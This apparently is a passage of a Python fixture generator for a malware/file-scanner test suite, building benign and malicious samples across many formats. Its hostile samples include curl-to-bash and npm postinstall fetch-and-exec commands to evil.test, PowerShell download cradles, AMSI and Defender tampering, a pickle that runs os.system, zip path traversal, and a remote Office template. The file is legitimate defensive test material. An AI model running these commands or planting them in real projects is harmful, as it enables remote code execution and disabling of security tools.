"""
build_fixtures.py — deterministic fixture generator for media-transfer-scan-tool.

Run from the repo root:  python tests/fixtures/build_fixtures.py

Generates the synthetic fixtures consumed by the Pester test suite that are
awkward to ship as committed binaries. Static .whl fixtures with real metadata
(clean_pkg, vulnerable_deps_pkg) are committed directly under corpus/python/.

The PE/ELF builders below are ported from scan-python-packages' fixture
generator so native-binary triage can be tested without shipping opaque blobs.
"""

import io
import json
import os
import struct
import random
import zipfile

FIXTURES_DIR = os.path.dirname(__file__)
CORPUS_DIR   = os.path.join(FIXTURES_DIR, 'corpus')
PYTHON_DIR   = os.path.join(CORPUS_DIR, 'python')
NATIVE_DIR   = os.path.join(CORPUS_DIR, 'native')
PYSRC_DIR    = os.path.join(CORPUS_DIR, 'pysource')
NOTEBOOK_DIR = os.path.join(CORPUS_DIR, 'notebook')
DISGUISED_DIR = os.path.join(CORPUS_DIR, 'disguised')
PDF_DIR    = os.path.join(CORPUS_DIR, 'pdf')
OFFICE_DIR = os.path.join(CORPUS_DIR, 'office')
SHELL_DIR  = os.path.join(CORPUS_DIR, 'shell')
PS_DIR     = os.path.join(CORPUS_DIR, 'powershell')
NPM_DIR    = os.path.join(CORPUS_DIR, 'npm')
PYREQ_DIR  = os.path.join(CORPUS_DIR, 'python_requirements')
NUGET_DIR  = os.path.join(CORPUS_DIR, 'nuget')
MODEL_DIR  = os.path.join(CORPUS_DIR, 'model')
ARCHIVE_DIR = os.path.join(CORPUS_DIR, 'archive')
PYRULES_DIR = os.path.join(CORPUS_DIR, 'python_rules')
VBA_DIR     = os.path.join(CORPUS_DIR, 'vba')
os.makedirs(PYTHON_DIR, exist_ok=True)
os.makedirs(NATIVE_DIR, exist_ok=True)
os.makedirs(PYSRC_DIR, exist_ok=True)
os.makedirs(NOTEBOOK_DIR, exist_ok=True)
os.makedirs(DISGUISED_DIR, exist_ok=True)
os.makedirs(PDF_DIR, exist_ok=True)
os.makedirs(OFFICE_DIR, exist_ok=True)
os.makedirs(SHELL_DIR, exist_ok=True)
os.makedirs(PS_DIR, exist_ok=True)
for sub in ('clean', 'malicious', 'js', 'tarball', 'locked'):
    os.makedirs(os.path.join(NPM_DIR, sub), exist_ok=True)
for sub in ('clean', 'unpinned', 'vulnerable', 'hash_pinned'):
    os.makedirs(os.path.join(PYREQ_DIR, sub), exist_ok=True)
for sub in ('clean', 'vulnerable'):
    os.makedirs(os.path.join(NUGET_DIR, sub), exist_ok=True)
os.makedirs(MODEL_DIR, exist_ok=True)
os.makedirs(ARCHIVE_DIR, exist_ok=True)
os.makedirs(PYRULES_DIR, exist_ok=True)
os.makedirs(VBA_DIR, exist_ok=True)

RANDOM_SEED   = 13371337
FIXED_ZIP_DT  = (2026, 1, 1, 0, 0, 0)
FIXED_EPOCH   = 1767225600   # 2026-01-01 UTC, for deterministic tar mtimes


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────
def seeded_bytes(label: str, length: int) -> bytes:
    rng = random.Random(f"{RANDOM_SEED}:{label}")
    return bytes(rng.randrange(0, 256) for _ in range(length))


def align(value: int, boundary: int) -> int:
    return ((value + boundary - 1) // boundary) * boundary


def make_minimal_pe(imports=None, sections=None) -> bytes:
    """Build a minimal-but-valid 32-bit PE image (parseable by pefile)."""
    imports = imports or {}
    section_alignment = 0x1000
    file_alignment = 0x200
    image_base = 0x400000
    header_size = 0x200

    section_defs = []
    raw_ptr = header_size
    virtual_addr = 0x1000
    base_sections = sections or [(".text", b"\xC3" + b"\x90" * 63)]

    for name, data in base_sections:
        raw = data.ljust(align(len(data), file_alignment), b"\x00")
        chars = 0x60000020 if name == ".text" else 0x40000040
        section_defs.append({"name": name, "data": raw, "virtual_size": len(data),
                             "virtual_addr": virtual_addr, "raw_ptr": raw_ptr, "chars": chars})
        raw_ptr += len(raw)
        virtual_addr += align(max(len(data), 1), section_alignment)

    import_rva = 0
    import_size = 0
    if imports:
        rdata_rva = virtual_addr
        descriptor_count = len(imports) + 1
        cursor = descriptor_count * 20
        dll_records = []
        rdata = bytearray(b"\x00" * cursor)
        for dll, funcs in sorted(imports.items()):
            cursor = align(cursor, 4)
            ilt_off = cursor
            cursor += 4 * (len(funcs) + 1)
            iat_off = cursor
            cursor += 4 * (len(funcs) + 1)
            name_off = cursor
            dll_bytes = dll.encode("ascii") + b"\x00"
            cursor += len(dll_bytes)
            hint_offsets = []
            for func in funcs:
                cursor = align(cursor, 2)
                hint_offsets.append(cursor)
                cursor += 2 + len(func.encode("ascii")) + 1
            if len(rdata) < cursor:
                rdata.extend(b"\x00" * (cursor - len(rdata)))
            rdata[name_off:name_off + len(dll_bytes)] = dll_bytes
            for index, func in enumerate(funcs):
                hint_name_rva = rdata_rva + hint_offsets[index]
                struct.pack_into("<I", rdata, ilt_off + index * 4, hint_name_rva)
                struct.pack_into("<I", rdata, iat_off + index * 4, hint_name_rva)
                func_bytes = func.encode("ascii") + b"\x00"
                struct.pack_into("<H", rdata, hint_offsets[index], 0)
                start = hint_offsets[index] + 2
                rdata[start:start + len(func_bytes)] = func_bytes
            dll_records.append((rdata_rva + ilt_off, rdata_rva + name_off, rdata_rva + iat_off))
        for index, (ilt_rva, name_rva, iat_rva) in enumerate(dll_records):
            struct.pack_into("<IIIII", rdata, index * 20, ilt_rva, 0, 0, name_rva, iat_rva)
        import_rva = rdata_rva
        import_size = descriptor_count * 20
        rdata_bytes = bytes(rdata)
        section_defs.append({"name": ".rdata",
                             "data": rdata_bytes.ljust(align(len(rdata_bytes), file_alignment), b"\x00"),
                             "virtual_size": len(rdata_bytes), "virtual_addr": rdata_rva,
                             "raw_ptr": raw_ptr, "chars": 0x40000040})
        raw_ptr += align(len(rdata_bytes), file_alignment)
        virtual_addr += align(max(len(rdata_bytes), 1), section_alignment)

    size_of_image = align(virtual_addr, section_alignment)
    dos = bytearray(0x80)
    dos[0:2] = b"MZ"
    struct.pack_into("<I", dos, 0x3C, 0x80)
    coff = struct.pack("<HHIIIHH", 0x14C, len(section_defs), 0, 0, 0, 224, 0x210E)
    optional = bytearray(224)
    struct.pack_into("<HBBIII", optional, 0, 0x10B, 14, 0, 0x200, 0, 0)
    struct.pack_into("<III", optional, 16, 0x1000, 0x1000, 0)
    struct.pack_into("<III", optional, 28, image_base, section_alignment, file_alignment)
    struct.pack_into("<HHHHHH", optional, 40, 6, 0, 0, 0, 6, 0)
    struct.pack_into("<I", optional, 56, size_of_image)
    struct.pack_into("<I", optional, 60, header_size)
    struct.pack_into("<H", optional, 68, 3)
    struct.pack_into("<III", optional, 72, 0x100000, 0x1000, 0x100000)
    struct.pack_into("<II", optional, 84, 0x1000, 0)
    struct.pack_into("<I", optional, 92, 16)
    struct.pack_into("<II", optional, 104, import_rva, import_size)

    section_headers = bytearray()
    for section in section_defs:
        name = str(section["name"]).encode("ascii")[:8].ljust(8, b"\x00")
        data = section["data"]
        section_headers.extend(struct.pack("<8sIIIIIIHHI", name, int(section["virtual_size"]),
                               int(section["virtual_addr"]), len(data), int(section["raw_ptr"]),
                               0, 0, 0, 0, int(section["chars"])))

    headers = (bytes(dos) + b"PE\x00\x00" + coff + bytes(optional) + bytes(section_headers)).ljust(header_size, b"\x00")
    image = bytearray(headers)
    for section in section_defs:
        start = int(section["raw_ptr"])
        data = section["data"]
        if len(image) < start:
            image.extend(b"\x00" * (start - len(image)))
        image[start:start + len(data)] = data
    return bytes(image)


def make_packed_pe() -> bytes:
    """PE with a high-entropy section (triggers BINARY-HIGH-ENTROPY)."""
    return make_minimal_pe(sections=[(".text", b"\xC3" + b"\x90" * 63),
                                     (".packed", seeded_bytes("packed-pe", 1024))])


def make_wheel(pkg: str, version: str, internal: dict) -> bytes:
    """Build a .whl (zip) containing the given internal files + a dist-info METADATA."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        for arcname, data in sorted(internal.items()):
            zi = zipfile.ZipInfo(arcname, date_time=FIXED_ZIP_DT)
            z.writestr(zi, data)
        meta = f"Metadata-Version: 2.1\nName: {pkg}\nVersion: {version}\n"
        zi = zipfile.ZipInfo(f"{pkg}-{version}.dist-info/METADATA", date_time=FIXED_ZIP_DT)
        z.writestr(zi, meta)
    return buf.getvalue()


def make_nupkg(pkg_id: str, version: str) -> bytes:
    """Build a minimal .nupkg (zip) containing just a top-level .nuspec."""
    nuspec = (
        '<?xml version="1.0" encoding="utf-8"?>\n'
        '<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd">\n'
        '  <metadata>\n'
        f'    <id>{pkg_id}</id>\n'
        f'    <version>{version}</version>\n'
        '    <authors>fixture</authors>\n'
        '    <description>deterministic test fixture — not a real package</description>\n'
        '  </metadata>\n'
        '</package>\n'
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        zi = zipfile.ZipInfo(f'{pkg_id}.nuspec', date_time=FIXED_ZIP_DT)
        z.writestr(zi, nuspec)
    return buf.getvalue()


def write(path: str, data: bytes) -> None:
    with open(path, 'wb') as f:
        f.write(data)
    print(f'  wrote {path}')


# ─────────────────────────────────────────────────────────────────────────────
# Python-archive hazard fixtures
# ─────────────────────────────────────────────────────────────────────────────
write(os.path.join(PYTHON_DIR, 'corrupt_pkg-1.0-py3-none-any.whl'),
      b'This is not a ZIP file\x00\x01\x02\x03')

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as z:
    z.writestr('safe/file.py', 'x = 1\n')
    z.writestr('../../../evil.py', 'import os; os.system("echo pwned")\n')
write(os.path.join(PYTHON_DIR, 'traversal_pkg-1.0-py3-none-any.whl'), buf.getvalue())

# ─────────────────────────────────────────────────────────────────────────────
# Native-binary fixtures (wheels containing .pyd binaries)
# ─────────────────────────────────────────────────────────────────────────────
# Clean PE .pyd — baseline, expect no binary findings
write(os.path.join(NATIVE_DIR, 'native_clean_pkg-1.0-py3-none-any.whl'),
      make_wheel('native_clean_pkg', '1.0', {
          'native_clean_pkg/__init__.py': b'pass\n',
          'native_clean_pkg/ext.pyd': make_minimal_pe(imports={'kernel32.dll': ['GetModuleHandleA']}),
      }))

# Suspicious imports — process-injection APIs (expect BINARY-SUSPICIOUS-IMPORT HIGH)
write(os.path.join(NATIVE_DIR, 'suspicious_imports_pkg-1.0-py3-none-any.whl'),
      make_wheel('suspicious_imports_pkg', '1.0', {
          'suspicious_imports_pkg/__init__.py': b'pass\n',
          'suspicious_imports_pkg/payload.pyd': make_minimal_pe(
              imports={'kernel32.dll': ['CreateRemoteThread', 'VirtualAllocEx', 'WriteProcessMemory']}),
      }))

# Network import — ws2_32.dll (expect BINARY-NETWORK-IMPORT MEDIUM)
write(os.path.join(NATIVE_DIR, 'network_native_pkg-1.0-py3-none-any.whl'),
      make_wheel('network_native_pkg', '1.0', {
          'network_native_pkg/__init__.py': b'pass\n',
          'network_native_pkg/net.pyd': make_minimal_pe(imports={'ws2_32.dll': ['connect', 'send', 'recv']}),
      }))

# Fake .pyd — not a real PE (expect BINARY-INVALID-FORMAT HIGH)
write(os.path.join(NATIVE_DIR, 'fake_native_pkg-1.0-py3-none-any.whl'),
      make_wheel('fake_native_pkg', '1.0', {
          'fake_native_pkg/__init__.py': b'pass\n',
          'fake_native_pkg/fake.pyd': seeded_bytes('fake-pyd', 64),
      }))

# ─────────────────────────────────────────────────────────────────────────────
# Loose Python source fixtures (for Bandit + detect-secrets, deep tier)
# Secret-like strings are ASSEMBLED FROM FRAGMENTS so this generator file does
# not itself trip GitHub push-protection / secret scanning.
# ─────────────────────────────────────────────────────────────────────────────
clean_py = (
    '"""Benign module — no risky calls, no secrets."""\n'
    'def add(a, b):\n'
    '    return a + b\n'
)
write_text = lambda p, s: (open(p, 'w', encoding='utf-8', newline='\n').write(s), print(f'  wrote {p}'))[1]
write_text(os.path.join(PYSRC_DIR, 'clean.py'), clean_py)

# Risky code — Bandit B307 (eval, MEDIUM) + B602 (subprocess shell=True, HIGH)
risky_py = (
    'import subprocess\n'
    'def run(user_input, cmd):\n'
    '    eval(user_input)\n'
    '    subprocess.Popen(cmd, shell=True)\n'
)
write_text(os.path.join(PYSRC_DIR, 'risky.py'), risky_py)

# Secrets — assembled so the literals never appear whole in this file.
aws_key = 'AKIA' + 'QWERTYUIOP123456'                       # AWS key format: AKIA + 16
pem_hdr = '-----BEGIN ' + 'RSA PRIVATE KEY' + '-----'        # PrivateKeyDetector trigger
secrets_py = (
    '# Deterministic fixture with fake credentials (not real).\n'
    f'aws_access_key = "{aws_key}"\n'
    f'private_key = "{pem_hdr}\\nMIIBfake/not/a/real/key==\\n"\n'
)
write_text(os.path.join(PYSRC_DIR, 'secrets.py'), secrets_py)

# ─────────────────────────────────────────────────────────────────────────────
# PythonRules (core middle-tier) fixtures — curated high-signal indicators.
# These exercise the AST helper scan_python.py: per-call rules + combinations.
# ─────────────────────────────────────────────────────────────────────────────
# Clean: imports and uses subprocess SAFELY (no shell=True) + benign logic.
pyr_clean = (
    '"""Benign utility — no high-signal indicators."""\n'
    'import subprocess\n'
    'def list_dir(path):\n'
    '    return subprocess.run(["ls", path], capture_output=True)\n'
    'def add(a, b):\n'
    '    return a + b\n'
)
write_text(os.path.join(PYRULES_DIR, 'pyr_clean.py'), pyr_clean)

# Malicious: eval + os.system + subprocess shell=True + pickle.loads, plus a
# download-and-run combo (urlopen -> base64 decode -> eval).
pyr_evil = (
    'import os, base64, subprocess\n'
    'import pickle as pk\n'
    'from urllib.request import urlopen\n'
    'def stage(url):\n'
    '    blob = urlopen(url).read()\n'
    '    payload = base64.b64decode(blob)\n'
    '    eval(payload)\n'                     # PY-EVAL + PY-DECODE-EXEC + PY-DOWNLOAD-EXEC
    '    os.system("id")\n'                   # PY-OS-SYSTEM
    '    subprocess.Popen("sh -i", shell=True)\n'  # PY-SUBPROCESS-SHELL
    '    return pk.loads(payload)\n'          # PY-PICKLE-LOAD
)
write_text(os.path.join(PYRULES_DIR, 'pyr_malicious.py'), pyr_evil)

# Negative control for false positives: the trigger words appear only inside a
# string literal and a comment — the AST scanner must NOT flag these.
pyr_strings = (
    '"""Doc mentions eval() and os.system() but never calls them."""\n'
    'NOTE = "do not use eval or os.system here"\n'
    '# pickle.loads is dangerous; this line is just a comment\n'
    'def safe():\n'
    '    return len(NOTE)\n'
)
write_text(os.path.join(PYRULES_DIR, 'pyr_strings.py'), pyr_strings)

# ─────────────────────────────────────────────────────────────────────────────
# Jupyter notebook fixtures (.ipynb — JSON, never executed by the scanner)
# ─────────────────────────────────────────────────────────────────────────────
def notebook(cells):
    return json.dumps({"cells": cells, "metadata": {}, "nbformat": 4, "nbformat_minor": 5}, indent=1)

def code_cell(src, outputs=None):
    return {"cell_type": "code", "execution_count": None, "metadata": {},
            "source": src, "outputs": outputs or []}

# Clean notebook — benign code cell, no outputs
write_text(os.path.join(NOTEBOOK_DIR, 'nb_clean.ipynb'),
           notebook([code_cell(["x = 1 + 1\n", "print(x)\n"])]))

# Eval notebook — risky code cell (Bandit flags via projection under -Profile full)
write_text(os.path.join(NOTEBOOK_DIR, 'nb_eval.ipynb'),
           notebook([code_cell(["user = 'data'\n", "eval(user)\n"])]))

# Outputs notebook — code cell with saved outputs (NOTEBOOK-SAVED-OUTPUT)
write_text(os.path.join(NOTEBOOK_DIR, 'nb_outputs.ipynb'),
           notebook([code_cell(["print('hi')\n"],
                     outputs=[{"output_type": "stream", "name": "stdout", "text": ["hi\n"]}])]))

# Malformed notebook — valid JSON but no cells array (NOTEBOOK-MALFORMED)
write_text(os.path.join(NOTEBOOK_DIR, 'nb_malformed.ipynb'),
           json.dumps({"not_cells": [], "nbformat": 4}))

# ─────────────────────────────────────────────────────────────────────────────
# Disguised scripts (v0.2) — real scripts under innocent extensions, NO shebang,
# so detection must come from content signatures (signal #3).
# ─────────────────────────────────────────────────────────────────────────────
# PowerShell downloader disguised as .txt (classic evasion)
write_text(os.path.join(DISGUISED_DIR, 'readme.txt'),
    "[CmdletBinding()]\nparam($Url)\n"
    "$wc = New-Object System.Net.WebClient\n"
    "Invoke-Expression ($wc.DownloadString('http://example.test/p'))\n"
    "Write-Host 'done'\n")

# Bash script disguised as .log
write_text(os.path.join(DISGUISED_DIR, 'output.log'),
    "if [ -f /etc/passwd ]; then\n"
    "  export TOKEN=abc\n"
    "  curl http://example.test/x | bash\n"
    "fi\n"
    "echo done\n")

# Python disguised as .dat
write_text(os.path.join(DISGUISED_DIR, 'data.dat'),
    "import os\n"
    "import subprocess\n"
    "def run():\n"
    "    os.system('id')\n"
    "if __name__ == '__main__':\n"
    "    run()\n")

# Batch disguised as .txt
write_text(os.path.join(DISGUISED_DIR, 'notes2.txt'),
    "@echo off\n"
    "setlocal\n"
    "set TARGET=%USERPROFILE%\n"
    "goto end\n"
    ":end\n")

# Negative control — plain English prose, must NOT be flagged disguised
write_text(os.path.join(DISGUISED_DIR, 'memo.txt'),
    "This is a plain text memo about the project status.\n"
    "We import lessons from past work and define our goals for next quarter.\n"
    "Please print this document and review it before the meeting.\n")

# ─────────────────────────────────────────────────────────────────────────────
# PDF fixtures (v0.3) — minimal PDFs carrying the trigger keywords. The scanner
# does keyword triage on raw bytes, so these need not be fully renderable.
# ─────────────────────────────────────────────────────────────────────────────
def write_pdf(name: str, body: str) -> None:
    content = "%PDF-1.7\n1 0 obj\n<< " + body + " >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n"
    write_text(os.path.join(PDF_DIR, name), content)

write_pdf('pdf_clean.pdf',    "/Type /Catalog /Pages 2 0 R")
write_pdf('pdf_js.pdf',       "/Type /Catalog /OpenAction << /S /JavaScript /JS (app.alert\\('x'\\);) >>")
write_pdf('pdf_launch.pdf',   "/Type /Catalog /OpenAction << /S /Launch /F (cmd.exe) >>")
write_pdf('pdf_embedded.pdf', "/Type /Catalog /Names << /EmbeddedFiles 3 0 R >> /EmbeddedFile 4 0 R")
write_pdf('pdf_encrypted.pdf',"/Type /Catalog /Encrypt 5 0 R")
# Obfuscated /JavaScript via PDF name hex escapes (/#4A#61...) — must still be caught
write_pdf('pdf_obfuscated.pdf', "/Type /Catalog /OpenAction << /S /#4A#61#76#61#53#63#72#69#70#74 >>")
# Disguised: .pdf extension but not a real PDF
write_text(os.path.join(PDF_DIR, 'pdf_fake.pdf'), "this is not really a pdf file at all\n")

# ─────────────────────────────────────────────────────────────────────────────
# Office (OOXML) fixtures (v0.3) — minimal zips exercising the stdlib checks.
# ─────────────────────────────────────────────────────────────────────────────
_CONTENT_TYPES = ('<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                  'package/2006/content-types">'
                  '<Default Extension="xml" ContentType="application/xml"/></Types>')

def write_docx(name: str, document_xml: str, extra: dict | None = None) -> None:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
        z.writestr(zipfile.ZipInfo('[Content_Types].xml', FIXED_ZIP_DT), _CONTENT_TYPES)
        z.writestr(zipfile.ZipInfo('word/document.xml', FIXED_ZIP_DT), document_xml)
        for arc, data in sorted((extra or {}).items()):
            z.writestr(zipfile.ZipInfo(arc, FIXED_ZIP_DT), data)
    write(os.path.join(OFFICE_DIR, name), buf.getvalue())   # bytes, not text

_DOC_BODY = '<?xml version="1.0"?><w:document xmlns:w="x"><w:body><w:p/></w:body></w:document>'

# Clean — no macros, DDE, or template
write_docx('office_clean.docx', _DOC_BODY)

# Macro-enabled — contains a vbaProject.bin (presence check fires; bytes are fake)
write_docx('office_macro.docm', _DOC_BODY,
           {'word/vbaProject.bin': seeded_bytes('vba', 256)})

# DDEAUTO field in the main document part
write_docx('office_dde.docx',
           '<?xml version="1.0"?><w:document xmlns:w="x"><w:body>'
           '<w:p><w:fldSimple w:instr=" DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/></w:p>'
           '</w:body></w:document>')

# Remote-template injection — external attachedTemplate in settings rels
write_docx('office_template.docx', _DOC_BODY, {
    'word/settings.xml': '<?xml version="1.0"?><w:settings xmlns:w="x"/>',
    'word/_rels/settings.xml.rels':
        '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/'
        'package/2006/relationships"><Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
        'Target="http://evil.test/template.dotm" TargetMode="External"/></Relationships>',
})

# ─────────────────────────────────────────────────────────────────────────────
# Shell script fixtures (v0.4)
# ─────────────────────────────────────────────────────────────────────────────
write_text(os.path.join(SHELL_DIR, 'clean.sh'),
    '#!/bin/bash\n'
    'set -euo pipefail\n'
    'name="$1"\n'
    'echo "Hello, ${name}"\n')

write_text(os.path.join(SHELL_DIR, 'remote_exec.sh'),
    '#!/bin/bash\n'
    'curl https://example.test/install.sh | bash\n')

write_text(os.path.join(SHELL_DIR, 'b64_exec.sh'),
    '#!/bin/bash\n'
    'echo "cGF5bG9hZAo=" | base64 -d | bash\n')

write_text(os.path.join(SHELL_DIR, 'eval_expand.sh'),
    '#!/bin/bash\n'
    'USER_INPUT="$1"\n'
    'eval "$USER_INPUT"\n')

write_text(os.path.join(SHELL_DIR, 'chmod777.sh'),
    '#!/bin/bash\n'
    'chmod 777 /tmp/payload\n'
    './tmp/payload\n')

write_text(os.path.join(SHELL_DIR, 'hardcoded_ip.sh'),
    '#!/bin/bash\n'
    'SERVER=192.168.1.100\n'
    'curl http://$SERVER/data\n')

# sc_bugs.sh — shell code ShellCheck RELIABLY flags as errors/warnings:
#   SC2086: unquoted variable in echo and test
#   SC2050: comparing string with -eq
#   SC2006: use $(...) instead of backticks
write_text(os.path.join(SHELL_DIR, 'sc_bugs.sh'),
    '#!/bin/bash\n'
    'var="hello world"\n'
    'echo $var\n'                     # SC2086: double quote to prevent globbing
    'count=`ls | wc -l`\n'            # SC2006: use $(...) not backticks
    'if [ "$count" -eq 0 ]; then\n'
    '  echo "empty"\n'
    'fi\n')

# ─────────────────────────────────────────────────────────────────────────────
# PowerShell fixtures (v0.5)
# ─────────────────────────────────────────────────────────────────────────────
write_text(os.path.join(PS_DIR, 'clean.ps1'),
    '[CmdletBinding()]\n'
    'param([Parameter(Mandatory)][string]$Name)\n'
    'Write-Output "Hello, $Name"\n')

# Classic offensive-PowerShell downloader cradle: IEX + DownloadString
write_text(os.path.join(PS_DIR, 'downloader.ps1'),
    '$wc = New-Object System.Net.WebClient\n'
    "IEX ($wc.DownloadString('http://example.test/payload.ps1'))\n")

# Encoded command + hidden window
write_text(os.path.join(PS_DIR, 'encoded.ps1'),
    'powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand '
    'aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAKQA=\n')

# Base64 decode + AMSI tampering
write_text(os.path.join(PS_DIR, 'amsi.ps1'),
    "$data = [System.Convert]::FromBase64String('cABheWxvYWQ=')\n"
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n")

# Defender tampering
write_text(os.path.join(PS_DIR, 'defender.ps1'),
    'Add-MpPreference -ExclusionPath "C:\\\\temp\\\\payload"\n'
    'Set-MpPreference -DisableRealtimeMonitoring $true\n')

# ─────────────────────────────────────────────────────────────────────────────
# npm fixtures (v0.6)
# ─────────────────────────────────────────────────────────────────────────────
import tarfile as _tarfile

# Clean package.json — only normal scripts, no install hooks
write_text(os.path.join(NPM_DIR, 'clean', 'package.json'),
    json.dumps({"name": "clean-pkg", "version": "1.0.0",
                "scripts": {"build": "tsc", "test": "jest"}}, indent=2))

# Malicious package.json — postinstall fetch-and-exec (the #1 npm vector)
_malicious_pkg = {
    "name": "evil-pkg", "version": "1.0.0",
    "scripts": {
        "postinstall": "node -e \"require('child_process').exec('curl http://evil.test/x | sh')\"",
        "build": "tsc",
    },
    "bin": {"evil": "./cli.js"},
}
write_text(os.path.join(NPM_DIR, 'malicious', 'package.json'),
           json.dumps(_malicious_pkg, indent=2))

# JavaScript fixtures
write_text(os.path.join(NPM_DIR, 'js', 'evil.js'),
    "const cp = require('child_process');\n"
    "cp.exec('whoami');\n"
    "eval(globalThis.atob('cGF5bG9hZA=='));\n")
write_text(os.path.join(NPM_DIR, 'js', 'clean.js'),
    "function add(a, b) {\n  return a + b;\n}\nmodule.exports = { add };\n")

# npm tarball (.tgz) — package/package.json with a postinstall hook
_tgz = os.path.join(NPM_DIR, 'tarball', 'evil_pkg-1.0.0.tgz')
_pjbytes = json.dumps({"name": "evil-tarball", "version": "1.0.0",
    "scripts": {"postinstall": "node ./steal.js"}}, indent=2).encode('utf-8')
with _tarfile.open(_tgz, 'w:gz') as tf:
    info = _tarfile.TarInfo('package/package.json'); info.size = len(_pjbytes); info.mtime = FIXED_EPOCH
    tf.addfile(info, io.BytesIO(_pjbytes))
print(f'  wrote {_tgz}')

# Lockfile with a known-vulnerable exact version (for the online OSV layer).
# lodash 4.17.4 has multiple published advisories in OSV.
write_text(os.path.join(NPM_DIR, 'locked', 'package.json'),
    json.dumps({"name": "locked-pkg", "version": "1.0.0",
                "dependencies": {"lodash": "4.17.4"}}, indent=2))
write_text(os.path.join(NPM_DIR, 'locked', 'package-lock.json'),
    json.dumps({"name": "locked-pkg", "version": "1.0.0", "lockfileVersion": 3,
                "packages": {"": {"name": "locked-pkg", "version": "1.0.0"},
                             "node_modules/lodash": {"version": "4.17.4"}}}, indent=2))

# ─────────────────────────────────────────────────────────────────────────────
# requirements.txt fixtures (OSV/PyPI dependency audit, issue #32)
# ─────────────────────────────────────────────────────────────────────────────
# Clean: exact-pinned, not (currently) vulnerable — offline/structural assertions
# only; never asserted against live OSV results, which can change over time.
write_text(os.path.join(PYREQ_DIR, 'clean', 'requirements.txt'),
    "# clean, exact-pinned deps\n"
    "certifi==2024.2.2\n")

# Unpinned: every line exercises a different "not an exact pin" shape. No
# network needed — these must all be reported as OSV-PYPI-UNPINNED and never
# reach the querybatch call.
write_text(os.path.join(PYREQ_DIR, 'unpinned', 'requirements.txt'),
    "# range specifier\n"
    "flask>=2.0\n"
    "# no specifier at all\n"
    "requests\n"
    "# compound specifier (comma-joined)\n"
    "weird==1.0,!=1.0.1\n"
    "# option line — not a dependency, must be skipped entirely\n"
    "-r other.txt\n"
    "# editable/VCS install — no exact version, must still be reported (not silently dropped)\n"
    "-e git+https://example.test/repo.git#egg=editable-pkg\n"
    "\n")

# Hash-pinned (pip-compile/pip-tools style): a real exact pin whose --hash
# options are appended on continuation lines. Must still be recognized as
# pinned — offline-safe assertion: the offline coverage-gap note fires only
# when at least one dependency was actually parsed as pinned.
write_text(os.path.join(PYREQ_DIR, 'hash_pinned', 'requirements.txt'),
    "certifi==2024.2.2 \\\n"
    "    --hash=sha256:0000000000000000000000000000000000000000000000000000000000000a \\\n"
    "    --hash=sha256:0000000000000000000000000000000000000000000000000000000000000b\n")

# Vulnerable: exact-pinned to a version with well-known published advisories
# (CVE-2023-44271 and others exist for Pillow < 10.0.1) — for the Online layer.
write_text(os.path.join(PYREQ_DIR, 'vulnerable', 'requirements.txt'),
    "Pillow==9.5.0\n")

# ─────────────────────────────────────────────────────────────────────────────
# .nupkg fixtures (OSV/NuGet dependency audit, issue #32)
# ─────────────────────────────────────────────────────────────────────────────
# Clean: a package id/version that does not exist on OSV — offline/structural
# assertions only, same rationale as the PyPI 'clean' fixture above.
write(os.path.join(NUGET_DIR, 'clean', 'Contoso.Fixture.Clean.1.0.0.nupkg'),
      make_nupkg('Contoso.Fixture.Clean', '1.0.0'))

# Vulnerable: Newtonsoft.Json 12.0.1 has a published advisory (GHSA-5crp-9r3c-p9vr,
# DoS via unbounded nesting depth, fixed in 13.0.1) — for the Online layer.
write(os.path.join(NUGET_DIR, 'vulnerable', 'Newtonsoft.Json.12.0.1.nupkg'),
      make_nupkg('Newtonsoft.Json', '12.0.1'))

# ─────────────────────────────────────────────────────────────────────────────
# Model / pickle fixtures (v0.7)
# ─────────────────────────────────────────────────────────────────────────────
import pickle as _pickle
import struct as _struct

# Benign pickle — plain data, no GLOBAL/REDUCE
write(os.path.join(MODEL_DIR, 'safe.pkl'),
      _pickle.dumps({"weights": [1, 2, 3], "name": "clean-model"}))

# Malicious pickle — __reduce__ returns os.system(...) => GLOBAL + REDUCE.
# Only DUMPED here (never loaded); the class need not be importable later.
class _Exploit:
    def __reduce__(self):
        import os
        return (os.system, ("echo pwned",))
write(os.path.join(MODEL_DIR, 'malicious.pkl'), _pickle.dumps(_Exploit()))

# safetensors — safe-by-design (8-byte LE header length + JSON header)
_st_header = b'{"__metadata__":{"format":"pt"}}'
write(os.path.join(MODEL_DIR, 'model.safetensors'),
      _struct.pack('<Q', len(_st_header)) + _st_header)

# PyTorch-style .pt — a ZIP containing <name>/data.pkl (malicious pickle)
_pt = os.path.join(MODEL_DIR, 'model.pt')
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as z:
    z.writestr(zipfile.ZipInfo('model/data.pkl', FIXED_ZIP_DT), _pickle.dumps(_Exploit()))
write(_pt, buf.getvalue())

# ─────────────────────────────────────────────────────────────────────────────
# Generic-archive hazard fixtures (v0.8)
# ─────────────────────────────────────────────────────────────────────────────
# Clean zip — normal files, no hazards
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('a.txt', FIXED_ZIP_DT), 'hello\n')
    z.writestr(zipfile.ZipInfo('dir/b.txt', FIXED_ZIP_DT), 'world\n')
write(os.path.join(ARCHIVE_DIR, 'clean.zip'), buf.getvalue())

# Decompression bomb — one entry of 16 MiB zeros. NOTE: a ZipInfo defaults to
# ZIP_STORED, so compress_type must be passed explicitly or it won't compress.
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as z:
